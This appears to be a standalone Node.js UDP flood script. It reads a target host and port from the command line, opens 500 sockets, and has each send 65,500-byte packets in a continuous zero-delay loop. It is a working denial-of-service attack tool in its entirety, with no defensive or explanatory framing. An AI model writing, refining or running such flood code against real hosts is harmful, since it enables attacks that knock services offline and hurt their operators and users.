const dgram = require('dgram');

const onde = process.argv[3];
const mande = process.argv[4];
const loli = 65500;

console.clear()

function ambasing(onde, mande) {
    for (let i = 0; i < 500; i++) {
        const skids = dgram.createSocket('udp4');
        const packet = Buffer.alloc(loli, 'P');
        function sendPacket() {

            skids.send(packet, 0, packet.length, onde, mande, (err) => {
                if (err) {
                    console.error('Failed to send packet:', err);
                } else {
                    console.log(`Packet sent from socket ${i + 1}`);
                }
            });
        }
        setInterval(sendPacket, 0);
    }
}

ambasing(onde, mande);